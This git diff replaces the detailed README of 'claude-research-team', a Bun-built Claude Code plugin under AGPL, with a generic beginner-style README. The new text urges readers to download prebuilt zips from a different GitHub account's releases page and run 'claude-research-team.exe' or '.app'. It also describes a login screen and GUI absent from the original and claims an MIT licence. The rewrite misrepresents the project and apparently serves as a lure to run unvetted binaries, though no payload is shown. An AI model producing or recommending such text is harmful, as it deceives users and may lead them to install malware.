@@ -1,486 +1,86 @@
-<p align="center">
-  <img src="assets/logo.png" alt="Claude Research Team" width="180">
-</p>
+# 🤖 claude-research-team - Research With Ease and Confidence
 
-<h1 align="center">Claude Research Team</h1>
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/anaxmohammed/claude-research-team/releases)
 
-<p align="center">
-  <strong>A unified knowledge layer for Claude Code</strong>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://www.gnu.org/licenses/agpl-3.0"><img src="https://img.shields.io/badge/License-AGPL%20v3-blue.svg" alt="License: AGPL v3"></a>
-  <a href="https://bun.sh"><img src="https://img.shields.io/badge/Runtime-Bun-f472b6" alt="Bun"></a>
-  <a href="https://claude.com/claude-code"><img src="https://img.shields.io/badge/Claude%20Code-Plugin-orange" alt="Claude Code Plugin"></a>
-</p>
+Welcome to the **claude-research-team** project! This application helps you use autonomous research agents to passively gather useful context for Claude Code. Even if you're not familiar with programming, you can easily set it up and start benefiting from its capabilities.
 
----
+Follow these steps to download and run the application on your computer.
 
-## What This Is
+## 💻 System Requirements
 
-Claude Research Team is a **knowledge augmentation system** that gives Claude Code access to:
+Before downloading, make sure your computer meets these requirements:
 
-- **Memory** — What you've done, decided, learned, and built (via [claude-mem](https://github.com/thedotmack/claude-mem))
-- **Research** — External knowledge gathered asynchronously by AI agents
+- Operating System: Windows 10 or later / macOS 10.12 or later / Linux (any distribution with a modern graphical interface)
+- Memory: At least 4 GB of RAM
+- Disk Space: Minimum 500 MB free space
+- Internet Connection: Required for downloading and using the application
 
-When Claude encounters a question, error, or unfamiliar pattern, this system queries the unified knowledge base. If relevant memory exists, it injects that context. If research would help, agents fetch and synthesize it. Often, both are combined.
+## 📥 Download & Install
 
-The result: Claude remembers your past decisions AND can look things up—without you having to ask.
+To get the software, follow these steps:
 
----
+1. **Visit the Releases Page:**
+   Go to the [Releases page](https://github.com/anaxmohammed/claude-research-team/releases) to find the latest version available.
 
-## The Core Idea
+2. **Choose the Right File:**
+   Locate the download for your operating system. Look for filenames like `claude-research-team-windows.zip`, `claude-research-team-mac.zip`, or `claude-research-team-linux.tar.gz`.
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                    UNIFIED KNOWLEDGE BASE                    │
-│                                                              │
-│  ┌─────────────────┐             ┌─────────────────────┐    │
-│  │     MEMORY      │             │      RESEARCH       │    │
-│  │                 │             │                     │    │
-│  │ Your decisions  │             │ External docs       │    │
-│  │ Past solutions  │      +      │ Best practices      │    │
-│  │ Code patterns   │             │ Error explanations  │    │
-│  │ Project context │             │ Library guides      │    │
-│  └─────────────────┘             └─────────────────────┘    │
-│                                                              │
-│                         ▼                                    │
-│            ┌───────────────────────┐                        │
-│            │   SMART INJECTION     │                        │
-│            │                       │                        │
-│            │ • Memory only (80t)   │                        │
-│            │ • Research only (100t)│                        │
-│            │ • Combined (150t)     │                        │
-│            │ • Warning/pivot (120t)│                        │
-│            └───────────────────────┘                        │
-│                         │                                    │
-│                         ▼                                    │
-│              Claude's conversation                           │
-│                (seamless context)                            │
-└─────────────────────────────────────────────────────────────┘
-```
+3. **Download the File:**
+   Click on the file to begin downloading. This may take some time depending on your internet speed.
 
----
+4. **Unzip the File:** 
+   Once the download is complete, locate the downloaded file on your computer and unzip it. You can right-click the file and select “Extract All” on Windows, or double-click the archive on macOS.
 
-## How It Works
+5. **Run the Application:**
+   - **Windows:** Open the unzipped folder, double-click `claude-research-team.exe` to start the application.
+   - **macOS:** Open the unzipped folder, then double-click on `claude-research-team.app`.
+   - **Linux:** Open a terminal, navigate to the unzipped folder, and run `./claude-research-team`.
 
-### Knowledge Detection
+## 🎓 How to Use
 
-The system watches your Claude Code sessions via lifecycle hooks:
+After launching the application, you’ll see a straightforward interface designed for users of all skill levels.
 
-| Hook | What It Catches |
-|------|-----------------|
-| SessionStart | Initialize session, load project context |
-| UserPromptSubmit | Analyze questions for knowledge gaps |
-| PostToolUse | Detect errors, unfamiliar APIs, stuck patterns |
+1. **Login or Register:**
+   If prompted, either log in with your existing account or create a new account.
 
-### Injection Types
+2. **Set Up Your Preferences:**
+   Adjust your settings to personalize your research experience. You can choose what kind of information you want to gather.
 
-Based on what's found in the knowledge base:
+3. **Start Researching:**
+   Hit the “Start” button to let the application begin its passive research. It will gather relevant context for you without any need for interaction.
 
-| Type | When Used | Example |
-|------|-----------|---------|
-| **Memory Only** | Strong match in past work | "You implemented JWT refresh tokens in project-x using httpOnly cookies" |
-| **Research Only** | New topic, nothing in memory | "Hono rate-limiter middleware: configure windowMs, max, keyGenerator" |
-| **Combined** | Both relevant | Memory of your approach + current best practices |
-| **Warning** | Research suggests better approach | "Consider using `ky` instead of manual fetch retry logic" |
+4. **View Your Results:**
+   Once the research is complete, you can view the collected data directly in the application. You can also export the information for later use.
 
-### What Gets Injected
+## 🛠️ Features
 
-Injections are **concise** (80-150 tokens) and **actionable**:
+The **claude-research-team** application comes packed with features that help you make the most of your research efforts:
 
-```
-[Memory] You handled similar auth in api-gateway (Nov 20):
-Sliding window rate limiting with Redis for distributed state.
+- **Autonomous Agents:** Research agents work in the background, managing data collection for you.
+- **Context Injection:** Automatically integrates relevant context into your projects.
+- **User-Friendly Interface:** Simple navigation and clear instructions make it easy even for beginners.
+- **Cross-Platform Support:** Compatible with Windows, macOS, and Linux.
 
-[Research] Current Hono best practice: hono-rate-limiter supports
-sliding window natively, no Redis needed for single-instance.
-(91% confidence) [/research-detail abc123]
-```
+## 🌐 Community and Support
 
----
+You are not alone! Join our community for help and insights. You can do this by:
 
-## Quick Start
+- **Checking our Issues Page:** If you encounter any problems, visit the [Issues page](https://github.com/anaxmohammed/claude-research-team/issues) to see if others have similar concerns.
+- **Contacting Support:** For specific queries, reach out through our support channel linked on the repository.
 
-### Prerequisites
+## 📄 License
 
-- [Bun](https://bun.sh) runtime
-- [claude-mem](https://github.com/thedotmack/claude-mem) installed and running (port 37777)
-- At least one search API key (see Configuration)
-
-### Install
+This project is open-source and follows the MIT License. Feel free to modify and share it with others.
 
-```bash
-git clone https://github.com/bigph00t/claude-research-team
-cd claude-research-team
-bun install
-bun run build
-
-# Install as Claude Code plugin
-claude plugins install .
-```
-
-### Configure
+## 📝 Updates and Changelog
 
-Set up API keys in `.env` or export directly:
+Stay informed about the latest features and bug fixes. You can find the changelog in the repository or on the [Releases page](https://github.com/anaxmohammed/claude-research-team/releases). 
 
-```bash
-# Search APIs (at least one required)
-SERPER_API_KEY=xxx       # serper.dev (2,500/mo free)
-BRAVE_API_KEY=xxx        # brave.com/search/api (2,000/mo free)
-TAVILY_API_KEY=xxx       # tavily.com (1,000/mo free)
+## 🔗 Useful Links
 
-# Code search
-GITHUB_TOKEN=xxx         # For GitHub repo/code search
-
-# AI synthesis (choose one)
-# Default: Claude SDK (uses your Anthropic account)
-GEMINI_API_KEY=xxx       # Alternative: Gemini Flash (free tier)
-```
-
-### Start
-
-```bash
-bun run start
-```
-
-**Dashboards:**
-- Research: [http://localhost:3200](http://localhost:3200)
-- Memory: [http://localhost:37777](http://localhost:37777)
-
----
-
-## Usage
-
-### Automatic (Default)
-
-Once running, knowledge injection happens automatically:
-
-1. You work with Claude Code normally
-2. System detects questions, errors, or unfamiliar patterns
-3. Queries unified knowledge base
-4. Injects relevant memory and/or research
-5. You see context in your next response
-
-### Manual Skills
-
-```bash
-/research <query>              # Research any topic
-/research-status               # Check service health
-/research-detail <finding-id>  # Get full details + sources
-```
-
-### Research Depths
-
-| Depth | Time | Use For |
-|-------|------|---------|
-| quick | ~5s | Facts, definitions |
-| medium | ~15s | How-to, documentation |
-| deep | ~30s | Comparisons, analysis |
-
----
-
-## Architecture
-
-### Multi-Agent Research
-
-```
-ConversationWatcher
-│   Monitors tool outputs for research opportunities
-│   Queries unified knowledge base first
-│
-└── Coordinator
-    │   Plans research strategy, routes queries to specialists
-    │   Dispatches to specialists based on query intent
-    │
-    ├── WebSearchAgent      ─ General internet search
-    │   Serper, Brave, Tavily, DuckDuckGo
-    │
-    ├── CodeExpertAgent     ─ Code examples & implementations
-    │   GitHub Code/Repos, StackOverflow
-    │
-    ├── DocsExpertAgent     ─ Library documentation
-    │   Context7, npm, PyPI, crates.io, MDN, Dev.to
-    │
-    ├── CommunityExpertAgent ─ Discussions & opinions
-    │   HackerNews, Reddit, Twitter/X (via web search)
-    │
-    └── ResearchExpertAgent  ─ Academic & reference
-        Wikipedia, ArXiv
-```
-
-### Specialist Agents & Tools
-
-| Agent | Domain | Tools | Best For |
-|-------|--------|-------|----------|
-| **WebSearch** | General | Serper*, Brave*, Tavily*, DuckDuckGo | Current events, general queries, fallback |
-| **CodeExpert** | Code | GitHub*, StackOverflow | Code examples, implementations, Q&A |
-| **DocsExpert** | Documentation | Context7, npm, PyPI, crates.io, MDN, Dev.to, Official Docs* | Library docs, package info, API references |
-| **CommunityExpert** | Discussions | HackerNews, Reddit, Twitter* | Opinions, comparisons, discussions |
-| **ResearchExpert** | Academic | Wikipedia, ArXiv | Concepts, definitions, research papers |
-
-*Requires API key (see Configuration)
-
-### claude-mem Integration
-
-Research findings are saved as **observations** (type: `discovery`) in claude-mem's database:
-
-```
-research-team                    claude-mem
-     │                               │
-     │  saveResearchAsObservation()  │
-     │ ────────────────────────────► │
-     │                               │
-     │  • observations table         │
-     │  • type = 'discovery'         │
-     │  • full FTS5 indexing         │
-     │  • vector embeddings          │
-     │                               │
-     │  searchKnowledge()            │
-     │ ◄──────────────────────────── │
-     │                               │
-     │  • Combined memory + research │
-     │  • Relevance scoring          │
-     │  • Smart injection decision   │
-```
-
-### Knowledge Flow
-
-```
-Tool Output → Watcher → Knowledge Query → Decision
-                              │              │
-                              ▼              ▼
-                    ┌──────────────┐  ┌──────────────┐
-                    │ Memory Found │  │ No Memory    │
-                    └──────────────┘  └──────────────┘
-                           │                 │
-                    ┌──────┴──────┐          ▼
-                    ▼             ▼    ┌──────────────┐
-             ┌──────────┐  ┌──────────┐│   Trigger    │
-             │ Inject   │  │ Inject + ││   Research   │
-             │ Memory   │  │ Research ││              │
-             └──────────┘  └──────────┘└──────────────┘
-                                              │
-                                              ▼
-                                       ┌──────────────┐
-                                       │ When Ready:  │
-                                       │ Inject       │
-                                       │ Research     │
-                                       └──────────────┘
-```
-
----
-
-## Configuration
-
-### Dashboard Settings
-
-Access at [http://localhost:3200](http://localhost:3200):
-
-| Setting | Default | Description |
-|---------|---------|-------------|
-| AI Provider | Claude | Claude SDK or Gemini Flash |
-| Model | Haiku | Claude tier (Haiku/Sonnet/Opus) |
-| Autonomous Research | Enabled | Auto-trigger from conversation |
-| Confidence Threshold | 0.85 | Min confidence to inject |
-| Relevance Threshold | 0.8 | Min relevance to inject |
-| Session Cooldown | 60s | Between researches |
-| Max Per Hour | 15 | Global limit |
-
-### Injection Budget
-
-| Parameter | Default | Description |
-|-----------|---------|-------------|
-| maxPerSession | 5 | Max injections per session |
-| maxTokensPerInjection | 150 | Token limit per injection |
-| maxTotalTokensPerSession | 500 | Total tokens per session |
-| cooldownMs | 30000 | Between injections |
-
-### claude-mem Thresholds
-
-| Threshold | Default | Description |
-|-----------|---------|-------------|
-| minRelevanceScore | 0.5 | Consider for injection |
-| memoryOnlyThreshold | 0.8 | Strong memory = memory only |
-| researchOnlyThreshold | 0.6 | Research threshold |
-| combinedThreshold | 0.6 | Both must exceed for combined |
-
----
-
-## Integrated Tools
-
-### All 17+ Search Sources
-
-| Tool | Agent | API Key | Description |
-|------|-------|---------|-------------|
-| **Serper** | WebSearch | Required | Google search results via serper.dev |
-| **Brave** | WebSearch | Required | Brave Search API |
-| **Tavily** | WebSearch | Required | AI-optimized search |
-| **DuckDuckGo** | WebSearch | Free | Privacy-focused search |
-| **GitHub** | CodeExpert | Required | Code search & repository search |
-| **StackOverflow** | CodeExpert | Free | Programming Q&A via StackExchange API |
-| **Context7** | DocsExpert | Free | Deep library documentation with code examples |
-| **npm** | DocsExpert | Free | Node.js package registry |
-| **PyPI** | DocsExpert | Free | Python package index |
-| **crates.io** | DocsExpert | Free | Rust crate registry |
-| **MDN** | DocsExpert | Free | Mozilla Developer Network web docs |
-| **Dev.to** | DocsExpert | Free | Developer tutorials and guides |
-| **Official Docs** | DocsExpert | Serper | Site-restricted search for official docs |
-| **HackerNews** | CommunityExpert | Free | Tech news via Algolia API |
-| **Reddit** | CommunityExpert | Free | Discussions via old.reddit.com JSON |
-| **Twitter/X** | CommunityExpert | Serper/Brave | Site-restricted search (no Twitter API needed) |
-| **Wikipedia** | ResearchExpert | Free | Encyclopedic knowledge |
-| **ArXiv** | ResearchExpert | Free | Academic papers (CS, ML, Math, Physics) |
-
-### Free Tools (No API Key Required)
-
-These work out of the box:
-
-- **General Search**: DuckDuckGo
-- **Code**: StackOverflow
-- **Documentation**: Context7, npm, PyPI, crates.io, MDN, Dev.to
-- **Community**: HackerNews, Reddit
-- **Research**: Wikipedia, ArXiv
-
----
-
-## API Reference
-
-### Status
-```http
-GET /api/health              # Health check
-GET /api/status              # Full status + config
-```
-
-### Research
-```http
-POST /api/research
-{
-  "query": "how to implement caching",
-  "depth": "medium",
-  "trigger": "user"
-}
-```
-
-### Knowledge
-```http
-GET /api/knowledge/search?q=<query>    # Unified search
-GET /api/knowledge/:id                  # Get observation
-GET /api/findings                       # Research findings
-GET /api/injections                     # Injection history
-```
-
-### Sessions
-```http
-GET /api/sessions                       # Active sessions
-POST /api/sessions                      # Create session
-```
-
----
-
-## Project Structure
-
-```
-claude-research-team/
-├── src/
-│   ├── adapters/
-│   │   ├── claude-mem-adapter.ts    # Unified knowledge access
-│   │   └── context7-adapter.ts      # Context7 MCP client
-│   ├── agents/
-│   │   ├── coordinator.ts           # Research planning & routing
-│   │   ├── conversation-watcher.ts  # Opportunity detection
-│   │   └── specialists/
-│   │       ├── index.ts             # Agent registry
-│   │       ├── base.ts              # Base specialist class
-│   │       ├── web-search.ts        # WebSearchAgent
-│   │       ├── code-expert.ts       # CodeExpertAgent
-│   │       ├── docs-expert.ts       # DocsExpertAgent
-│   │       ├── community-expert.ts  # CommunityExpertAgent
-│   │       ├── research-expert.ts   # ResearchExpertAgent
-│   │       ├── meta-evaluator.ts    # Result evaluation
-│   │       └── source-assessor.ts   # Source quality assessment
-│   ├── crew/
-│   │   ├── autonomous-crew.ts       # Multi-agent orchestration
-│   │   └── research-executor.ts     # Task execution
-│   ├── database/
-│   │   ├── index.ts                 # SQLite + FTS5
-│   │   └── sqlite-adapter.ts        # Bun/Node compatibility
-│   ├── injection/
-│   │   ├── manager.ts               # Injection logic
-│   │   └── formatters.ts            # Format functions
-│   ├── hooks/                       # Claude Code hooks
-│   ├── service/
-│   │   ├── server.ts                # HTTP + Dashboard
-│   │   └── session-manager.ts       # Session tracking
-│   └── types.ts                     # TypeScript definitions
-├── skills/
-│   ├── research/                    # /research skill
-│   ├── research-status/             # /research-status skill
-│   └── research-detail/             # /research-detail skill
-├── plugin.json                      # Claude Code manifest
-└── package.json
-```
-
----
-
-## Development
-
-```bash
-bun install           # Install dependencies
-bun run build         # Build
-bun run dev           # Watch mode
-bun run start         # Start service
-bun run clean         # Clean build
-bun test              # Run tests
-```
-
----
-
-## Troubleshooting
-
-**Service won't start**
-```bash
-lsof -i :3200         # Check port
-bun run start         # Start manually
-```
-
-**claude-mem not connecting**
-```bash
-curl http://localhost:37777/api/health   # Check claude-mem
-ls ~/.claude-mem/claude-mem.db           # Database exists?
-```
-
-**No injections happening**
-- Check dashboard: autonomous research enabled?
-- Lower thresholds (try 0.6 relevance)
-- Verify API keys
-
-**Research not saving to claude-mem**
-- Check logs for "fallback mode" (adapter couldn't connect)
-- Restart both services
-
----
-
-## Philosophy
-
-This system is built on a simple insight: **knowledge compounds**.
-
-Every time you solve a problem, make a decision, or learn something new, that knowledge should be available in future sessions. Every research query should benefit not just the current conversation, but all future ones.
-
-The goal isn't to replace Claude's capabilities—it's to give Claude access to two things it doesn't have by default:
-1. Memory of your specific project history
-2. The ability to look things up during conversation
-
-Combined, these create an assistant that learns your codebase over time and can always fetch current information when needed.
-
----
-
-## License
-
-AGPL-3.0 — See [LICENSE](LICENSE)
-
----
-
-<p align="center">
-  <sub>Built for developers who want Claude to remember what they've done and know what they don't.</sub>
-</p>
+- [Download Latest Release](https://github.com/anaxmohammed/claude-research-team/releases)
+- [Issues Page](https://github.com/anaxmohammed/claude-research-team/issues)
+
+Now you are ready to harness the power of research agents. Download, install, and discover how much easier your projects can become!
